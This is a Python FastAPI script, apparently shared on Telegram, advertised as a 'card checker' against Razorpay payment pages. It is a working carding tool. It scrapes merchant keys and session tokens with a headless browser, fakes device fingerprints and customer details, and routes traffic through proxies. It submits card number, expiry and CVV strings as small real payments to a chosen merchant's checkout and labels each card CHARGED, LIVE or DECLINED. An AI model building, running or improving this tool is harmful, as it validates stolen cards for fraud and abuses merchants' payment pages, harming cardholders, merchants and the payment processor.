# ============================================================
#   RAZORPAY CARD CHECKER API v2.1 (Async Playwright fix)
#   Created by @MUMIRU_BRO
#   Free script — do NOT sell or claim as your own.
#   Telegram: @MUMIRU_BRO
# ============================================================

import requests
import json
import time
import random
from urllib.parse import urlencode, urlparse, parse_qs
import re
import string
from playwright.async_api import async_playwright
from fastapi import FastAPI, Query, HTTPException
import uvicorn

app = FastAPI(title="Razorpay Card Checker API", version="2.1")

# ------------------------------------------------------------
# Helper functions (async versions)
# ------------------------------------------------------------

def setup_proxy(proxy_string):
    if not proxy_string or proxy_string.strip() == "":
        return None
    try:
        parts = proxy_string.strip().split(':')
        if len(parts) == 4:
            ip, port, user, pw = [p.strip() for p in parts]
            if not all([ip, port, user, pw]):
                return None
            return {"server": f"http://{ip}:{port}", "username": user, "password": pw}
        return None
    except:
        return None

def generate_device_fingerprint():
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(128))

async def get_dynamic_session_token(proxy_config):
    try:
        async with async_playwright() as p:
            browser_args = ['--no-sandbox', '--disable-dev-shm-usage'] if 'linux' in sys.platform else []
            browser = await p.chromium.launch(headless=True, proxy=proxy_config, args=browser_args)
            page = await browser.new_page()
            await page.set_extra_http_headers({
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            })
            await page.goto("https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1", timeout=30000)
            await page.wait_for_url("**/checkout/public*session_token*", timeout=25000)
            token = parse_qs(urlparse(page.url).query).get("session_token", [None])[0]
            await browser.close()
            return (token, None) if token else (None, "Token not found in URL.")
    except Exception as e:
        return None, f"Session token error: {str(e)[:100]}"

async def extract_merchant_data(site_url, proxy_config):
    merchant_match = re.search(r'razorpay\.me/@([^/?]+)', site_url)
    merchant_handle = merchant_match.group(1) if merchant_match else None

    try:
        async with async_playwright() as p:
            browser_args = ['--no-sandbox', '--disable-dev-shm-usage'] if 'linux' in sys.platform else []
            browser = await p.chromium.launch(headless=True, proxy=proxy_config, args=browser_args)
            page = await browser.new_page()
            await page.set_extra_http_headers({
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            })

            intercepted = {}
            def on_resp(r):
                if "api.razorpay.com/v1/payment_links/merchant" in r.url:
                    try:
                        intercepted['data'] = r.json()
                    except:
                        pass

            page.on("response", on_resp)
            await page.goto(site_url, timeout=45000, wait_until='networkidle')
            await page.wait_for_timeout(3000)

            eval_data = await page.evaluate("""() => {
                const d = window.data || window.__INITIAL_STATE__ || window.__CHECKOUT_DATA__ || window.razorpayData;
                if (d && d.keyless_header) return d;

                for (let k in window) {
                    try {
                        if (window[k] && typeof window[k] === 'object' && window[k].keyless_header) return window[k];
                    } catch(e) {}
                }

                const scripts = document.querySelectorAll('script');
                for (let s of scripts) {
                    const txt = s.textContent || s.innerText;
                    if (txt.includes('keyless_header') || txt.includes('payment_link')) {
                        const matches = txt.match(/({[^{}]*(?:{[^{}]*}[^{}]*)*})/g);
                        if (matches) {
                            for (let match of matches) {
                                try {
                                    const parsed = JSON.parse(match);
                                    if (parsed.keyless_header || parsed.key_id) return parsed;
                                } catch (e) {}
                            }
                        }
                    }
                }
                return null;
            }""")
            await browser.close()

            final = eval_data or intercepted.get('data')
            if final:
                kh = final.get('keyless_header')
                kid = final.get('key_id')
                pl = final.get('payment_link') or final

                if isinstance(pl, str):
                    try:
                        pl = json.loads(pl)
                    except:
                        pass

                plid = pl.get('id') if isinstance(pl, dict) else final.get('payment_link_id')
                ppi_list = pl.get('payment_page_items', []) if isinstance(pl, dict) else []
                ppi = ppi_list[0].get('id') if ppi_list else final.get('payment_page_item_id')

                if kh and kid and plid and ppi:
                    return kh, kid, plid, ppi, None

            if merchant_handle:
                try:
                    api_url = f"https://api.razorpay.com/v1/payment_links/merchant/{merchant_handle}"
                    response = requests.get(api_url, timeout=10)
                    if response.status_code == 200:
                        api_data = response.json()
                        kh = api_data.get('keyless_header')
                        kid = api_data.get('key_id')
                        plid = api_data.get('id')
                        ppi = api_data.get('payment_page_items', [{}])[0].get('id')
                        if kh and kid and plid and ppi:
                            return kh, kid, plid, ppi, None
                except:
                    pass

            return None, None, None, None, "Extraction failed."
    except Exception as e:
        return None, None, None, None, f"Extraction error: {str(e)[:100]}"

def random_user_info():
    return {
        "name": "Test User",
        "email": f"testuser{random.randint(100, 999)}@gmail.com",
        "phone": f"9876543{random.randint(100, 999)}"
    }

def create_order(session, payment_link_id, amount_paise, payment_page_item_id):
    url = f"https://api.razorpay.com/v1/payment_pages/{payment_link_id}/order"
    headers = {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }
    payload = {
        "notes": {"comment": ""},
        "line_items": [{"payment_page_item_id": payment_page_item_id, "amount": amount_paise}]
    }
    try:
        resp = session.post(url, headers=headers, json=payload, timeout=15)
        resp.raise_for_status()
        return resp.json().get("order", {}).get("id")
    except:
        return None

def submit_payment(session, order_id, card_info, user_info, amount_paise, key_id, keyless_header, payment_link_id, session_token, site_url, device_fingerprint):
    card_number, exp_month, exp_year, cvv = card_info
    url = "https://api.razorpay.com/v1/standard_checkout/payments/create/ajax"
    params = {
        "key_id": key_id,
        "session_token": session_token,
        "keyless_header": keyless_header
    }
    headers = {
        "x-session-token": session_token,
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0"
    }
    data = {
        "notes[comment]": "",
        "payment_link_id": payment_link_id,
        "key_id": key_id,
        "contact": f"+91{user_info['phone']}",
        "email": user_info["email"],
        "currency": "INR",
        "_[library]": "checkoutjs",
        "_[platform]": "browser",
        "_[referer]": site_url,
        "amount": amount_paise,
        "order_id": order_id,
        "device_fingerprint[fingerprint_payload]": device_fingerprint,
        "method": "card",
        "card[number]": card_number,
        "card[cvv]": cvv,
        "card[name]": user_info["name"],
        "card[expiry_month]": exp_month,
        "card[expiry_year]": exp_year,
        "save": "0"
    }
    return session.post(url, headers=headers, params=params, data=urlencode(data), timeout=20)

def check_payment_status(payment_id, key_id, session_token, keyless_header):
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Referer': 'https://api.razorpay.com/v1/checkout/public?traffic_env=production',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-session-token': session_token,
    }
    params = {
        'key_id': key_id,
        'session_token': session_token,
        'keyless_header': keyless_header,
    }
    try:
        r = requests.get(
            f'https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}',
            params=params, headers=headers, timeout=15
        )
        if r.status_code == 200:
            data = r.json()
            return data.get('status', 'unknown'), data
        return 'unknown', {'error': f'Status check failed: {r.status_code}'}
    except Exception as e:
        return 'unknown', {'error': f'Status check error: {e}'}

def cancel_payment(payment_id, key_id, session_token, keyless_header):
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-type': 'application/x-www-form-urlencoded',
        'Referer': 'https://api.razorpay.com/v1/checkout/public?traffic_env=production',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-session-token': session_token,
    }
    params = {
        'key_id': key_id,
        'session_token': session_token,
        'keyless_header': keyless_header,
    }
    try:
        r = requests.get(
            f'https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}/cancel',
            params=params, headers=headers, timeout=15
        )
        try:
            return r.json()
        except json.JSONDecodeError:
            return {"error": {"description": f"Cancel HTTP {r.status_code}: {r.text[:200]}"}}
    except Exception as e:
        return {"error": {"description": f"Cancel request error: {e}"}}

def parse_decline_reason(cancel_data):
    if isinstance(cancel_data, dict) and "error" in cancel_data:
        err = cancel_data["error"]
        if isinstance(err, dict):
            desc = err.get('description', 'Declined')
            reason = err.get('reason', '')
            code = err.get('code', '')
            desc = desc.replace("%s", "Card")
            parts = [desc]
            if reason and reason != 'unknown':
                parts.append(f"Reason: {reason}")
            if code and code != 'N/A':
                parts.append(f"Code: {code}")
            return " | ".join(parts)
        return str(err)
    return json.dumps(cancel_data)[:100] if cancel_data else "Unknown decline reason"

def process_card(cc_line, plid, ppiid, kid, kh, stoken, site_url, amount_paise, device_fingerprint):
    start = time.time()
    try:
        num, mm, yy, cvv = cc_line.strip().split('|')
    except ValueError:
        return "SKIP", "Invalid format (need card|mm|yy|cvv)", 0, {}

    session = requests.Session()

    order_id = create_order(session, plid, amount_paise, ppiid)
    if not order_id:
        return "FAIL", "Order creation failed", round(time.time() - start, 2), {}

    time.sleep(random.uniform(1, 2))

    try:
        user_info = random_user_info()
        response = submit_payment(
            session, order_id, (num, mm, yy, cvv),
            user_info, amount_paise, kid, kh, plid, stoken, site_url, device_fingerprint
        )
        pdata = response.json()
    except Exception as e:
        return "ERROR", f"Payment submission failed: {str(e)[:60]}", round(time.time() - start, 2), {}

    pid = pdata.get("payment_id") or pdata.get("razorpay_payment_id")
    if not pid and isinstance(pdata.get("payment"), dict):
        pid = pdata["payment"].get("id")

    if pdata.get("redirect") == True or pdata.get("type") == "redirect":
        rurl = pdata.get('request', {}).get('url') if isinstance(pdata.get('request'), dict) else None
        if rurl and pid:
            time.sleep(3)

            stat, sdata = check_payment_status(pid, kid, stoken, kh)

            if stat in ['captured', 'authorized']:
                return "CHARGED", f"ID: {pid} | Status: {stat}", round(time.time() - start, 2), pdata

            if stat == 'failed':
                reason = "Payment failed"
                if isinstance(sdata, dict):
                    err = sdata.get('error_description') or sdata.get('error', {}).get('description', '')
                    if err:
                        reason = err
                return "DECLINED", f"ID: {pid} | {reason}", round(time.time() - start, 2), pdata

            if stat == 'created':
                return "LIVE", f"ID: {pid} | 3DS/OTP Required (Card is Live)", round(time.time() - start, 2), pdata

            cdata = cancel_payment(pid, kid, stoken, kh)
            if isinstance(cdata, dict) and "error" in cdata:
                err = cdata["error"]
                if isinstance(err, dict):
                    reason_code = err.get('reason', '')
                    desc = err.get('description', '')
                    if reason_code == 'payment_cancelled':
                        return "LIVE", f"ID: {pid} | 3DS/OTP Required (Card is Live)", round(time.time() - start, 2), pdata
                    else:
                        return "DECLINED", f"ID: {pid} | {desc}", round(time.time() - start, 2), pdata

            reason = parse_decline_reason(cdata)
            return "DECLINED", f"ID: {pid} | {reason}", round(time.time() - start, 2), pdata

        return "FAIL", f"3DS redirect missing URL (pid={pid})", round(time.time() - start, 2), pdata

    if "razorpay_signature" in pdata or "signature" in pdata:
        sig = pdata.get('razorpay_signature') or pdata.get('signature')
        return "CHARGED", f"ID: {pid} | Immediate success", round(time.time() - start, 2), pdata

    if "error" in pdata:
        err = pdata.get('error', {})
        if isinstance(err, dict):
            desc = err.get('description', 'Unknown error').replace("%s", "Card")
            code = err.get('code', 'N/A')
            reason = err.get('reason', '')
            msg = f"{desc} (Code: {code})"
            if reason:
                msg += f" [Reason: {reason}]"
            if pid:
                msg = f"ID: {pid} | {msg}"
            return "DECLINED", msg, round(time.time() - start, 2), pdata
        return "DECLINED", f"Error: {json.dumps(err)[:80]}", round(time.time() - start, 2), pdata

    return "UNKNOWN", f"Response: {json.dumps(pdata)[:100]}", round(time.time() - start, 2), pdata

# ------------------------------------------------------------
# Main API endpoint (async now, calls async helpers)
# ------------------------------------------------------------

@app.get("/rz")
async def check_card(
    cc: str = Query(..., description="Card in format: number|mm|yy|cvv (e.g., 4111111111111111|12|28|123)"),
    site_url: str = Query(..., description="Full Razorpay payment page URL (e.g., https://pages.razorpay.com/angroos)"),
    amount: int = Query(1, description="Amount in Rupees (minimum 1)"),
    proxy: str = Query(None, description="Optional proxy string: ip:port:username:password")
):
    """
    Check a credit/debit card against a Razorpay payment link.
    Returns JSON with status, message, and details.
    """
    if amount < 1:
        raise HTTPException(status_code=400, detail="Amount must be at least 1 Rupee")
    if '|' not in cc or len(cc.split('|')) != 4:
        raise HTTPException(status_code=400, detail="Invalid card format. Use: card|mm|yy|cvv")

    proxy_config = setup_proxy(proxy) if proxy else None

    device_fingerprint = generate_device_fingerprint()

    # Async extraction
    kh, kid, plid, ppiid, err = await extract_merchant_data(site_url, proxy_config)
    if err:
        raise HTTPException(status_code=400, detail=f"Merchant data extraction failed: {err}")

    stoken, token_err = await get_dynamic_session_token(proxy_config)
    if token_err:
        raise HTTPException(status_code=400, detail=f"Session token error: {token_err}")

    amount_paise = amount * 100

    try:
        tag, msg, elapsed, full_resp = process_card(
            cc, plid, ppiid, kid, kh, stoken, site_url, amount_paise, device_fingerprint
        )
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Card processing error: {str(e)}")

    card_number = cc.split('|')[0]
    masked_card = f"{card_number[:6]}****{card_number[-4:]}" if len(card_number) > 10 else card_number[:6] + "***"

    return {
        "status": tag,
        "message": msg,
        "card": masked_card,
        "amount_rupees": amount,
        "site_url": site_url,
        "full_response": full_resp,
        "elapsed_seconds": elapsed
    }

@app.get("/")
def root():
    return {"message": "Razorpay Card Checker API is running", "endpoint": "/rz"}

if __name__ == "__main__":
    import sys
    uvicorn.run(app, host="0.0.0.0", port=8000)
